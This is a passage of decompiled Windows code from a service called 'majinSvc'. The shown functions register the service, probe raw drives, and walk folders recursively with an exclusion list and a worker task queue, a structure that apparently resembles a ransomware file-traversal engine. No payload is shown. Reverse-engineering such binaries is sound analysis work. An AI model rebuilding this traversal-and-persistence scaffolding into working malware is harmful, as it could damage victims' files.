  unsigned int v12; // eax
  const char *v13; // rdx
  void (__fastcall *v14)(__int64, const char *, _QWORD, char *, _QWORD); // rbx
  unsigned int v15; // eax
  void (__fastcall *v16)(__int64, const char *, _QWORD, char *, _QWORD); // rbx
  unsigned int v17; // eax
  void (__fastcall *v18)(__int64, const char *, _QWORD, char *, _QWORD); // rbx
  unsigned int v19; // eax
  int v20; // [rsp+30h] [rbp-28h] BYREF
  __int64 v21; // [rsp+34h] [rbp-24h]
  int v22; // [rsp+48h] [rbp-10h]
  char v23; // [rsp+70h] [rbp+18h] BYREF

  v0 = qword_1400186C0();
  v1 = qword_140017000;
  v2 = (const char *)v0;
  if ( qword_140017000 != -1 )
  {
    v3 = (void (__fastcall *)(__int64, const char *, _QWORD, char *, _QWORD))qword_140018880;
    v4 = qword_1400187C8("SVC: cmdline=");
    v3(qword_140017000, "SVC: cmdline=", v4, &v23, 0);
    qword_1400186B8(qword_140017000);
    v1 = qword_140017000;
  }
  v5 = "(null)";
  if ( v2 != nullptr )
    v5 = v2;
  if ( v1 != -1 )
  {
    v6 = (void (__fastcall *)(__int64, const char *, _QWORD, char *, _QWORD))qword_140018880;
    v7 = qword_1400187C8(v5);
    v6(qword_140017000, v5, v7, &v23, 0);
    qword_1400186B8(qword_140017000);
    if ( qword_140017000 != -1 )
    {
      v8 = (void (__fastcall *)(__int64, const char *, _QWORD, char *, _QWORD))qword_140018880;
      v9 = qword_1400187C8("\r\n");
      v8(qword_140017000, "\r\n", v9, &v23, 0);
      qword_1400186B8(qword_140017000);
    }
  }
  result = qword_140018928("majinSvc", nullsub_1);
  qword_140017660 = result;
  if ( result == 0 )
  {
    if ( qword_140017000 == -1 )
      return result;
    v11 = (void (__fastcall *)(__int64, const char *, _QWORD, char *, _QWORD))qword_140018880;
    v12 = qword_1400187C8("SVC: RegisterServiceCtrlHandler FAIL\r\n");
    v13 = "SVC: RegisterServiceCtrlHandler FAIL\r\n";
    goto LABEL_19;
  }
  if ( qword_140017000 != -1 )
  {
    v14 = (void (__fastcall *)(__int64, const char *, _QWORD, char *, _QWORD))qword_140018880;
    v15 = qword_1400187C8("SVC: handler registered\r\n");
    v14(qword_140017000, "SVC: handler registered\r\n", v15, &v23, 0);
    qword_1400186B8(qword_140017000);
  }
  sub_14000A850(&v20, 0, 28);
  v20 = 16;
  v21 = 2;
  v22 = 3000;
  qword_140018930(qword_140017660, &v20);
  LODWORD(v21) = 4;
  qword_140018930(qword_140017660, &v20);
  if ( qword_140017000 != -1 )
  {
    v16 = (void (__fastcall *)(__int64, const char *, _QWORD, char *, _QWORD))qword_140018880;
    v17 = qword_1400187C8("SVC: RUNNING, entering MajinRun\r\n");
    v16(qword_140017000, "SVC: RUNNING, entering MajinRun\r\n", v17, &v23, 0);
    qword_1400186B8(qword_140017000);
  }
  sub_140001000();
  if ( qword_140017000 != -1 )
  {
    v18 = (void (__fastcall *)(__int64, const char *, _QWORD, char *, _QWORD))qword_140018880;
    v19 = qword_1400187C8("SVC: MajinRun returned\r\n");
    v18(qword_140017000, "SVC: MajinRun returned\r\n", v19, &v23, 0);
    qword_1400186B8(qword_140017000);
  }
  LODWORD(v21) = 1;
  result = qword_140018930(qword_140017660, &v20);
  if ( qword_140017000 != -1 )
  {
    v11 = (void (__fastcall *)(__int64, const char *, _QWORD, char *, _QWORD))qword_140018880;
    v12 = qword_1400187C8("SVC: STOPPED\r\n");
    v13 = "SVC: STOPPED\r\n";
LABEL_19:
    v11(qword_140017000, v13, v12, &v23, 0);
    return qword_1400186B8(qword_140017000);
  }
  return result;
}


// ----- sub_140003DE0 @ 0x140003de0 -----
_WORD *__fastcall sub_140003DE0(__int64 a1)
{
  int v2; // eax
  __int64 v3; // rbp
  __int64 (__fastcall *v4)(__int64, _QWORD, __int64); // rdi
  __int64 v5; // rax
  __int64 v6; // rax
  _WORD *v7; // rsi
  int v8; // eax
  __int16 v9; // cx
  __int64 (__fastcall *v11)(__int64, _QWORD, __int64); // rdi
  __int64 v12; // rbx
  __int64 v13; // rax
  __int64 v14; // rax
  __int64 v15; // rdi
  void (__fastcall *v16)(__int64, _QWORD, _WORD *); // rbx
  __int64 v17; // rax
  _WORD *v18; // rdx
  __int64 v19; // rcx
  void (__fastcall *v20)(__int64, _QWORD, _WORD *); // rbx
  __int64 v21; // rax
  __int64 (__fastcall *v22)(__int64, _QWORD, __int64); // rdi
  __int64 v23; // rbx
  __int64 v24; // rax
  __int64 v25; // rax

  v2 = qword_1400187D8(65001, 0, a1, 0xFFFFFFFFLL, 0, 0);
  v3 = v2;
  if ( v2 <= 0 )
    return nullptr;
  v4 = (__int64 (__fastcall *)(__int64, _QWORD, __int64))qword_140018768;
  v5 = qword_140018740();
  v6 = v4(v5, 0, 2 * v3);
  v7 = (_WORD *)v6;
  if ( v6 == 0 )
    return nullptr;
  qword_1400187D8(65001, 0, a1, 0xFFFFFFFFLL, v6, v3);
  v8 = qword_1400187D0(v7);
  if ( v8 >= 4 )
  {
    if ( *v7 == 92 && v7[1] == 92 )
    {
      v9 = v7[2];
      if ( (v9 == 63 || v9 == 46) && v7[3] == 92 )
        return v7;
      goto LABEL_13;
    }
LABEL_18:
    v22 = (__int64 (__fastcall *)(__int64, _QWORD, __int64))qword_140018768;
    v23 = 2LL * (v8 + 5);
    v24 = qword_140018740();
    v25 = v22(v24, 0, v23);
    v15 = v25;
    if ( v25 == 0 )
      goto LABEL_14;
    qword_1400187B8(v25, L"\\\\?\\");
    v19 = v15 + 8;
    v18 = v7;
    goto LABEL_17;
  }
  if ( v8 < 2 || *v7 != 92 || v7[1] != 92 )
    goto LABEL_18;
LABEL_13:
  v11 = (__int64 (__fastcall *)(__int64, _QWORD, __int64))qword_140018768;
  v12 = 2LL * (v8 + 7);
  v13 = qword_140018740();
  v14 = v11(v13, 0, v12);
  v15 = v14;
  if ( v14 == 0 )
  {
LABEL_14:
    v16 = (void (__fastcall *)(__int64, _QWORD, _WORD *))qword_140018770;
    v17 = qword_140018740();
    v16(v17, 0, v7);
    return nullptr;
  }
  qword_1400187B8(v14, L"\\\\?\\UNC\\");
  v18 = v7 + 2;
  v19 = v15 + 16;
LABEL_17:
  qword_1400187B8(v19, v18);
  v20 = (void (__fastcall *)(__int64, _QWORD, _WORD *))qword_140018770;
  v21 = qword_140018740();
  v20(v21, 0, v7);
  return (_WORD *)v15;
}


// ----- sub_140003FB0 @ 0x140003fb0 -----
__int64 __fastcall sub_140003FB0(char a1)
{
  unsigned int v2; // ebx
  __int64 v3; // rdi
  _QWORD v5[2]; // [rsp+40h] [rbp-38h] BYREF
  _BYTE v6[16]; // [rsp+50h] [rbp-28h] BYREF
  _BYTE v7[24]; // [rsp+60h] [rbp-18h] BYREF
  unsigned int v8; // [rsp+80h] [rbp+8h] BYREF

  qword_1400187B0(v7, "\\\\.\\X:");
  v7[4] = a1;
  v2 = 0;
  v3 = qword_140018648(v7, 0, 3, 0, 3, 0, 0);
  if ( v3 != -1 )
  {
    sub_14000A850(v5, 0, 12);
    v5[0] = 7;
    v8 = 0;
    if ( (unsigned int)((__int64 (__fastcall *)(__int64, __int64, _QWORD *, __int64, _BYTE *, int, unsigned int *, _QWORD))qword_140018688)(
                         v3,
                         2954240,
                         v5,
                         12,
                         v6,
                         12,
                         &v8,
                         0) != 0
      && v8 >= 0xC )
    {
      qword_140018640(v3);
      LOBYTE(v2) = v6[8] == 0;
      return v2;
    }
    qword_140018640(v3);
  }
  return 0;
}


// ----- sub_1400040C0 @ 0x1400040c0 -----
__int64 __fastcall sub_1400040C0(__int64 a1, __int64 a2)
{
  __int64 v4; // rbx
  int v5; // eax
  __int64 v6; // r13
  char v7; // cl
  __int64 v8; // rsi
  int v9; // ebp
  __int64 v10; // r14
  __int64 (__fastcall *v11)(__int64, _QWORD, __int64); // rdi
  __int64 v12; // rbx
  __int64 v13; // rax
  __int64 result; // rax
  __int64 v15; // rbx

  v4 = (int)qword_1400187C8(a1);
  v5 = qword_1400187C8(a2);
  v6 = v5;
  if ( (int)v4 <= 0 || (v7 = *(_BYTE *)(v4 + a1 - 1), v8 = v4, v7 == 92) || v7 == 47 )
  {
    v10 = 0;
    v8 = v4;
    v9 = 0;
  }
  else
  {
    v9 = 1;
    v10 = 1;
  }
  v11 = (__int64 (__fastcall *)(__int64, _QWORD, __int64))qword_140018768;
  v12 = (int)v4 + v5 + v9;
  v13 = qword_140018740();
  result = v11(v13, 0, v12 + 1);
  v15 = result;
  if ( result != 0 )
  {
    sub_14000A820(result, a1, v8);
    if ( v9 != 0 )
      *(_BYTE *)(v8 + v15) = 92;
    sub_14000A820(v15 + v8 + v10, a2, v6 + 1);
    return v15;
  }
  return result;
}


// ----- sub_1400041A0 @ 0x1400041a0 -----
void __fastcall sub_1400041A0(__int64 a1)
{
  __int64 v1; // r9
  unsigned __int64 v2; // rcx
  int v3; // r10d
  _BYTE *v4; // r11
  __int64 v5; // r8
  __int64 v6; // rbx
  __int64 v7; // rax
  char v8; // dl
  __int64 v9; // rdi
  void (__fastcall *v10)(__int64, _BYTE *, _QWORD, char *, _QWORD); // rbx
  unsigned int v11; // eax
  _BYTE v12[32]; // [rsp+30h] [rbp-28h] BYREF
  char v13; // [rsp+68h] [rbp+10h] BYREF

  if ( dword_140017658 != 0 )
  {
    if ( a1 < 0 )
      v12[0] = 45;
    v1 = -a1;
    if ( a1 > 0 )
      v1 = a1;
    v2 = (unsigned __int64)a1 >> 63;
    v3 = v2;
    v4 = &v12[(unsigned int)v2];
    if ( v1 != 0 )
    {
      v5 = (unsigned int)v2;
      do
      {
        v6 = v3++;
        *v4++ = v1 % 10 + 48;
        v1 /= 10;
      }
      while ( v1 != 0 );
      v7 = v6;
      if ( (unsigned int)v2 < v6 )
      {
        do
        {
          v8 = v12[v5];
          v12[v5++] = v12[v7];
          v12[v7--] = v8;
        }
        while ( v5 < v7 );
      }
    }
    else
    {
      *v4 = 48;
      v3 = v2 + 1;
    }
    v12[v3] = 0;
    v9 = qword_140018750(4294967285LL);
    if ( (unsigned __int64)(v9 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v10 = (void (__fastcall *)(__int64, _BYTE *, _QWORD, char *, _QWORD))qword_140018880;
      v11 = qword_1400187C8(v12);
      v10(v9, v12, v11, &v13, 0);
    }
  }
}


// ----- sub_1400042E0 @ 0x1400042e0 -----
void __fastcall sub_1400042E0(__int64 a1)
{
  __int64 v2; // rdi
  void (__fastcall *v3)(__int64, __int64, _QWORD, char *, _QWORD); // rbx
  unsigned int v4; // eax
  char v5; // [rsp+48h] [rbp+10h] BYREF

  if ( dword_140017658 != 0 )
  {
    v2 = qword_140018750(4294967285LL);
    if ( (unsigned __int64)(v2 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v3 = (void (__fastcall *)(__int64, __int64, _QWORD, char *, _QWORD))qword_140018880;
      v4 = qword_1400187C8(a1);
      v3(v2, a1, v4, &v5, 0);
    }
  }
}


// ----- sub_140004360 @ 0x140004360 -----
__int64 __fastcall sub_140004360(__int64 *a1, __int64 a2, int a3)
{
  __int64 (__fastcall *v3)(__int64, __int64, __int64); // rbx
  __int64 v7; // rax
  __int64 result; // rax
  __int64 v9; // rdi
  int v10; // eax
  __int64 (__fastcall *v11)(__int64, _QWORD, __int64); // rbx
  __int64 v12; // r14
  __int64 v13; // rax
  __int64 v14; // rax
  __int64 (__fastcall *v15)(__int64, _QWORD, __int64); // rbx
  __int64 v16; // rax
  __int64 v17; // rax

  v3 = (__int64 (__fastcall *)(__int64, __int64, __int64))qword_140018768;
  v7 = qword_140018740();
  result = v3(v7, 8, 24);
  v9 = result;
  if ( result != 0 )
  {
    v10 = qword_1400187C8(a2);
    v11 = (__int64 (__fastcall *)(__int64, _QWORD, __int64))qword_140018768;
    v12 = v10 + 1;
    v13 = qword_140018740();
    v14 = v11(v13, 0, v12);
    *(_QWORD *)v9 = v14;
    if ( v14 != 0 )
    {
      sub_14000A820(v14, a2, v12);
      *(_DWORD *)(v9 + 16) = a3;
      qword_140018690(a1 + 2);
      *(_QWORD *)(v9 + 8) = 0;
      v17 = a1[1];
      if ( v17 != 0 )
        *(_QWORD *)(v17 + 8) = v9;
      else
        *a1 = v9;
      a1[1] = v9;
      qword_140018790(a1 + 2);
      return qword_140018800(a1[7], 1, 0);
    }
    else
    {
      v15 = (__int64 (__fastcall *)(__int64, _QWORD, __int64))qword_140018770;
      v16 = qword_140018740();
      return v15(v16, 0, v9);
    }
  }
  return result;
}


// ----- sub_140004470 @ 0x140004470 -----
__int64 __fastcall sub_140004470(__int64 *a1)
{
  __int64 v2; // r15
  __int64 v4; // rcx
  int v5; // edi
  __int64 *v6; // r14
  __int64 v7; // rax
  __int64 v8; // rdi
  void (__fastcall *v9)(__int64, _QWORD, __int64); // rsi
  __int64 v10; // rdi
  __int64 v11; // rax
  void (__fastcall *v12)(__int64, _QWORD, __int64 *); // rdi
  __int64 v13; // rax
  void (__fastcall *v14)(__int64, _QWORD, __int64); // rbx
  __int64 v15; // rax
  void (__fastcall *v16)(__int64, _QWORD, __int64 *); // rbx
  __int64 v17; // rax
  _BYTE v18[8]; // [rsp+30h] [rbp-58h] BYREF
  int v19; // [rsp+38h] [rbp-50h]
  int v20; // [rsp+3Ch] [rbp-4Ch]

  v2 = qword_140018860(0, 0x400000, 12288, 4);
  if ( v2 == 0 )
    return 1;
  sub_140007020((unsigned int)v18, v2, 0x400000, *((_DWORD *)a1 + 21), *((_DWORD *)a1 + 22));
  v4 = a1[7];
  v19 = dword_140017658;
  v5 = qword_140018870(v4, 5000);
  if ( *((_DWORD *)a1 + 16) != 0 )
    goto LABEL_16;
  while ( 1 )
  {
    qword_140018690(a1 + 2);
    v6 = (__int64 *)*a1;
    if ( *a1 != 0 )
    {
      v7 = v6[1];
      *a1 = v7;
      if ( v7 == 0 )
        break;
    }
    qword_140018790(a1 + 2);
    if ( v6 != nullptr )
      goto LABEL_7;
    if ( *((_DWORD *)a1 + 16) != 0 || v5 != 0 )
      goto LABEL_16;
LABEL_9:
    v5 = qword_140018870(a1[7], 5000);
    if ( *((_DWORD *)a1 + 16) != 0 )
      goto LABEL_16;
  }
  a1[1] = 0;
  qword_140018790(a1 + 2);
LABEL_7:
  v8 = *v6;
  if ( *(_BYTE *)*v6 != 0 )
  {
    v20 = *((_DWORD *)v6 + 4);
    sub_140007050(v18, *v6);
    v9 = (void (__fastcall *)(__int64, _QWORD, __int64))qword_140018770;
    v10 = *v6;
    v11 = qword_140018740();
    v9(v11, 0, v10);
    v12 = (void (__fastcall *)(__int64, _QWORD, __int64 *))qword_140018770;
    v13 = qword_140018740();
    v12(v13, 0, v6);
    goto LABEL_9;
  }
  v14 = (void (__fastcall *)(__int64, _QWORD, __int64))qword_140018770;
  v15 = qword_140018740();
  v14(v15, 0, v8);
  v16 = (void (__fastcall *)(__int64, _QWORD, __int64 *))qword_140018770;
  v17 = qword_140018740();
  v16(v17, 0, v6);
LABEL_16:
  qword_140018868(v2, 0, 0x8000);
  return 0;
}


// ----- sub_140004660 @ 0x140004660 -----
__int64 __fastcall sub_140004660(__int64 *a1, __int64 a2, int a3, int a4)
{
  BOOL v4; // edi
  __int64 v5; // r14
  __int64 v6; // r13
  int v8; // r12d
  __int64 v9; // rsi
  void (__fastcall *v10)(__int64, const char *, _QWORD, int *, _QWORD); // rbx
  unsigned int v11; // eax
  __int64 v12; // rsi
  void (__fastcall *v13)(__int64, const char *, _QWORD, int *, _QWORD); // rbx
  unsigned int v14; // eax
  __int64 v15; // rsi
  void (__fastcall *v16)(__int64, const char *, _QWORD, _BYTE *, _QWORD); // rbx
  unsigned int v17; // eax
  __int64 v18; // rsi
  void (__fastcall *v19)(__int64, const char *, _QWORD, _BYTE *, _QWORD); // rbx
  unsigned int v20; // eax
  __int64 v21; // rsi
  void (__fastcall *v22)(__int64, const char *, _QWORD, _BYTE *, _QWORD); // rbx
  unsigned int v23; // eax
  __int64 v24; // rsi
  void (__fastcall *v25)(__int64, const char *, _QWORD, _BYTE *, _QWORD); // rbx
  unsigned int v26; // eax
  __int64 v27; // rax
  __int64 v28; // rsi
  _WORD *v29; // rax
  void (__fastcall *v30)(__int64, _QWORD, __int64); // rbx
  _WORD *v31; // r14
  __int64 v32; // rax
  __int64 v33; // rax
  void (__fastcall *v34)(__int64, _QWORD, _WORD *); // rbx
  __int64 v35; // r13
  __int64 v36; // rax
  unsigned int v37; // eax
  __int64 v38; // rbx
  __int64 v39; // rsi
  __int64 v40; // r14
  void (__fastcall *v41)(__int64, const char *, _QWORD, _BYTE *, _QWORD); // rbx
  unsigned int v42; // eax
  __int64 v43; // r14
  void (__fastcall *v44)(__int64, const char *, _QWORD, _BYTE *, _QWORD); // rbx
  unsigned int v45; // eax
  void (__fastcall *v46)(__int64, const char *, _QWORD, _BYTE *, _QWORD); // rbx
  unsigned int v47; // eax
  void (__fastcall *v48)(__int64, __int64, _QWORD, _BYTE *, _QWORD); // rbx
  unsigned int v49; // eax
  void (__fastcall *v50)(__int64, const char *, _QWORD, _BYTE *, _QWORD); // rbx
  unsigned int v51; // eax
  void (__fastcall *v52)(__int64, _QWORD, __int64); // rbx
  __int64 v53; // rax
  __int64 v54; // r14
  void (__fastcall *v55)(__int64, const char *, _QWORD, int *, _QWORD); // rbx
  unsigned int v56; // eax
  __int64 v57; // r14
  void (__fastcall *v58)(__int64, const char *, _QWORD, int *, _QWORD); // rbx
  unsigned int v59; // eax
  __int64 v60; // r14
  void (__fastcall *v61)(__int64, const char *, _QWORD, int *, _QWORD); // rbx
  unsigned int v62; // eax
  __int64 v63; // r14
  void (__fastcall *v64)(__int64, const char *, _QWORD, int *, _QWORD); // rbx
  unsigned int v65; // eax
  void (__fastcall *v66)(__int64, const char *, _QWORD, int *, _QWORD); // rbx
  unsigned int v67; // eax
  void (__fastcall *v68)(__int64, const char *, _QWORD, int *, _QWORD); // rbx
  unsigned int v69; // eax
  _BYTE v71[4]; // [rsp+40h] [rbp-C0h] BYREF
  _BYTE v72[4]; // [rsp+44h] [rbp-BCh] BYREF
  _BYTE v73[4]; // [rsp+48h] [rbp-B8h] BYREF
  _BYTE v74[4]; // [rsp+4Ch] [rbp-B4h] BYREF
  _BYTE v75[16]; // [rsp+50h] [rbp-B0h] BYREF
  _WORD v76[22]; // [rsp+60h] [rbp-A0h] BYREF
  _WORD v77[274]; // [rsp+8Ch] [rbp-74h] BYREF
  _BYTE v78[1072]; // [rsp+2B0h] [rbp+1B0h] BYREF
  int v80; // [rsp+700h] [rbp+600h] BYREF
  unsigned int v81; // [rsp+708h] [rbp+608h]

  v81 = a4;
  v80 = a3;
  v4 = false;
  v5 = a4;
  v6 = a3;
  v8 = 0;
  if ( a3 < a4 )
  {
    if ( dword_140017658 != 0 )
    {
      v15 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v15 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      {
        v16 = (void (__fastcall *)(__int64, const char *, _QWORD, _BYTE *, _QWORD))qword_140018880;
        v17 = qword_1400187C8("[*] push_split d=");
        v16(v15, "[*] push_split d=", v17, v71, 0);
      }
    }
    sub_1400041A0(v6);
    if ( dword_140017658 != 0 )
    {
      v18 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v18 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      {
        v19 = (void (__fastcall *)(__int64, const char *, _QWORD, _BYTE *, _QWORD))qword_140018880;
        v20 = qword_1400187C8("/");
        v19(v18, "/", v20, v71, 0);
      }
    }
    sub_1400041A0(v5);
    if ( dword_140017658 != 0 )
    {
      v21 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v21 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      {
        v22 = (void (__fastcall *)(__int64, const char *, _QWORD, _BYTE *, _QWORD))qword_140018880;
        v23 = qword_1400187C8(": ");
        v22(v21, ": ", v23, v71, 0);
      }
    }
    sub_1400042E0(a2);
    if ( dword_140017658 != 0 )
    {
      v24 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v24 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      {
        v25 = (void (__fastcall *)(__int64, const char *, _QWORD, _BYTE *, _QWORD))qword_140018880;
        v26 = qword_1400187C8("\r\n");
        v25(v24, "\r\n", v26, v71, 0);
      }
    }
    v27 = sub_1400040C0(a2, (__int64)"*");
    v28 = v27;
    if ( v27 != 0 )
    {
      v29 = sub_140003DE0(v27);
      v30 = (void (__fastcall *)(__int64, _QWORD, __int64))qword_140018770;
      v31 = v29;
      v32 = qword_140018740();
      v30(v32, 0, v28);
      if ( v31 != nullptr )
      {
        v33 = qword_1400186A8(v31, v76);
        v34 = (void (__fastcall *)(__int64, _QWORD, _WORD *))qword_140018770;
        v35 = v33;
        v36 = qword_140018740();
        v34(v36, 0, v31);
        if ( v35 == -1 )
        {
          sub_1400042E0((__int64)"[*]   FindFirstFileW FAIL err=");
          v37 = qword_140018710();
          sub_1400041A0(v37);
          sub_1400042E0((__int64)&unk_14000F438);
        }
        else
        {
          do
          {
            if ( v77[0] != 46
              && (v76[0] & 0x410) == 0x10
              && (int)qword_140018878(65001, 0, v77, 0xFFFFFFFFLL, v78, 1024, 0, 0) > 0 )
            {
              v38 = 0;
              while ( (unsigned int)qword_1400187A8(v78, off_14000F100[v38]) != 0 )
              {
                if ( (unsigned __int64)++v38 >= 27 )
                {
                  v39 = sub_1400040C0(a2, (__int64)v78);
                  if ( v39 != 0 )
                  {
                    if ( dword_140017658 != 0 )
                    {
                      v40 = qword_140018750(4294967285LL);
                      if ( (unsigned __int64)(v40 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
                      {
                        v41 = (void (__fastcall *)(__int64, const char *, _QWORD, _BYTE *, _QWORD))qword_140018880;
                        v42 = qword_1400187C8("[*] task: ");
                        v41(v40, "[*] task: ", v42, v71, 0);
                      }
                    }
                    sub_1400042E0(v39);
                    if ( dword_140017658 != 0 )
                    {
                      v43 = qword_140018750(4294967285LL);
                      if ( (unsigned __int64)(v43 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
                      {
                        v44 = (void (__fastcall *)(__int64, const char *, _QWORD, _BYTE *, _QWORD))qword_140018880;
                        v45 = qword_1400187C8("\r\n");
                        v44(v43, "\r\n", v45, v72, 0);
                      }
                    }
                    if ( qword_140017000 != -1 )
                    {
                      v46 = (void (__fastcall *)(__int64, const char *, _QWORD, _BYTE *, _QWORD))qword_140018880;
                      v47 = qword_1400187C8("SVC: task ");
                      v46(qword_140017000, "SVC: task ", v47, v73, 0);
                      qword_1400186B8(qword_140017000);
                      if ( qword_140017000 != -1 )
                      {
                        v48 = (void (__fastcall *)(__int64, __int64, _QWORD, _BYTE *, _QWORD))qword_140018880;
                        v49 = qword_1400187C8(v39);
                        v48(qword_140017000, v39, v49, v74, 0);
                        qword_1400186B8(qword_140017000);
                        if ( qword_140017000 != -1 )
                        {
                          v50 = (void (__fastcall *)(__int64, const char *, _QWORD, _BYTE *, _QWORD))qword_140018880;
                          v51 = qword_1400187C8("\r\n");
                          v50(qword_140017000, "\r\n", v51, v75, 0);
                          qword_1400186B8(qword_140017000);
                        }
                      }
                    }
                    sub_140004660(a1, v39, (unsigned int)(v80 + 1), v81);
                    v52 = (void (__fastcall *)(__int64, _QWORD, __int64))qword_140018770;
                    v53 = qword_140018740();
                    v52(v53, 0, v39);
                    ++v8;
                  }
                  break;
                }
              }
            }
          }
          while ( (unsigned int)qword_1400186B0(v35, v76) != 0 );
          qword_1400186A0(v35);
          if ( dword_140017658 != 0 )
          {
            v54 = qword_140018750(4294967285LL);
            if ( (unsigned __int64)(v54 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
            {
              v55 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
              v56 = qword_1400187C8("[*]   push root: ");
              v55(v54, "[*]   push root: ", v56, &v80, 0);
            }
          }
          sub_1400042E0(a2);
          if ( dword_140017658 != 0 )
          {
            v57 = qword_140018750(4294967285LL);
            if ( (unsigned __int64)(v57 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
            {
              v58 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
              v59 = qword_1400187C8(" shallow=");
              v58(v57, " shallow=", v59, &v80, 0);
            }
          }
          sub_1400041A0(v8 > 0);
          if ( dword_140017658 != 0 )
          {
            v60 = qword_140018750(4294967285LL);
            if ( (unsigned __int64)(v60 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
            {
              v61 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
              v62 = qword_1400187C8(" pushed_subdirs=");
              v61(v60, " pushed_subdirs=", v62, &v80, 0);
            }
          }
          sub_1400041A0(v8);
          if ( dword_140017658 != 0 )
          {
            v63 = qword_140018750(4294967285LL);
            if ( (unsigned __int64)(v63 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
            {
              v64 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
              v65 = qword_1400187C8("\r\n");
              v64(v63, "\r\n", v65, &v80, 0);
            }
          }
          if ( v8 > 0 )
          {
            if ( qword_140017000 != -1 )
            {
              v66 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
              v67 = qword_1400187C8("SVC: push_root shallow ");
              v66(qword_140017000, "SVC: push_root shallow ", v67, &v80, 0);
              qword_1400186B8(qword_140017000);
            }
            sub_140004EA0(a2);
            if ( qword_140017000 != -1 )
            {
              v68 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
              v69 = qword_1400187C8("\r\n");
              v68(qword_140017000, "\r\n", v69, &v80, 0);
              qword_1400186B8(qword_140017000);
            }
            sub_1400042E0((__int64)"[*] task: ");
            sub_1400042E0(a2);
            sub_1400042E0((__int64)" (shallow)\r\n");
          }
          v4 = v8 > 0;
        }
      }
      else
      {
        sub_1400042E0((__int64)"[*]   build_extended_path FAIL\r\n");
      }
    }
    else
    {
      sub_1400042E0((__int64)"[*]   join_path_heap FAIL\r\n");
    }
  }
  else
  {
    if ( dword_140017658 != 0 )
    {
      v9 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v9 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      {
        v10 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
        v11 = qword_1400187C8("[*] push_split (at depth limit): ");
        v10(v9, "[*] push_split (at depth limit): ", v11, &v80, 0);
      }
    }
    sub_1400042E0(a2);
    if ( dword_140017658 != 0 )
    {
      v12 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v12 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      {
        v13 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
        v14 = qword_1400187C8("\r\n");
        v13(v12, "\r\n", v14, &v80, 0);
      }
    }
  }
  return sub_140004360(a1, a2, v4);
}


// ----- sub_140004EA0 @ 0x140004ea0 -----
void __fastcall sub_140004EA0(__int64 a1)
{
  void (__fastcall *v2)(__int64, __int64, _QWORD, char *, _QWORD); // rbx
  unsigned int v3; // eax
  char v4; // [rsp+48h] [rbp+10h] BYREF

  if ( qword_140017000 != -1 )
  {
    v2 = (void (__fastcall *)(__int64, __int64, _QWORD, char *, _QWORD))qword_140018880;
    v3 = qword_1400187C8(a1);
    v2(qword_140017000, a1, v3, &v4, 0);
    qword_1400186B8(qword_140017000);
  }
}


// ----- sub_140004F00 @ 0x140004f00 -----
__int64 __fastcall sub_140004F00(__int64 a1)
{
  __int64 v1; // r8
  unsigned __int64 v2; // rcx
  unsigned int v3; // ebx
  _BYTE *v4; // r10
  __int64 v5; // r9
  __int64 v6; // r11
  __int64 v7; // rax
  char v8; // dl
  __int64 result; // rax
  _BYTE v10[40]; // [rsp+30h] [rbp-28h] BYREF
  char v11; // [rsp+60h] [rbp+8h] BYREF

  if ( a1 < 0 )
    v10[0] = 45;
  v1 = -a1;
  if ( a1 > 0 )
    v1 = a1;
  v2 = (unsigned __int64)a1 >> 63;
  v3 = v2;
  v4 = &v10[(unsigned int)v2];
  if ( v1 != 0 )
  {
    v5 = (unsigned int)v2;
    do
    {
      v6 = (int)v3++;
      *v4++ = v1 % 10 + 48;
      v1 /= 10;
    }
    while ( v1 != 0 );
    v7 = v6;
    if ( (unsigned int)v2 < v6 )
    {
      do
      {
        v8 = v10[v5];
        v10[v5++] = v10[v7];
        v10[v7--] = v8;
      }
      while ( v5 < v7 );
    }
  }
  else
  {
    *v4 = 48;
    v3 = v2 + 1;
  }
  result = qword_140018750(4294967285LL);
  if ( (unsigned __int64)(result - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    return qword_140018880(result, v10, v3, &v11, 0);
  return result;
}


// ----- sub_140005000 @ 0x140005000 -----
__int64 __fastcall sub_140005000(__int64 a1, unsigned int a2)
{
  __int64 result; // rax
  char v5; // [rsp+50h] [rbp+18h] BYREF

  result = qword_140018750(4294967285LL);
  if ( (unsigned __int64)(result - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    return qword_140018880(result, a1, a2, &v5, 0);
  return result;
}


// ----- sub_140005050 @ 0x140005050 -----
__int64 __fastcall sub_140005050(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v5; // r13
  unsigned int v6; // ebx
  __int64 v7; // r12
  int v8; // eax
  __int64 v10; // r14
  int v11; // edi
  __int64 v12; // rax
  int v13; // r8d
  __int64 v14; // rdi
  int v15; // r10d
  __int64 v16; // rdi
  unsigned int v17; // r10d
  char *v18; // r9
  __int64 v19; // rsi
  __int64 i; // rdx
  char v21; // cl
  __int64 v22; // r15
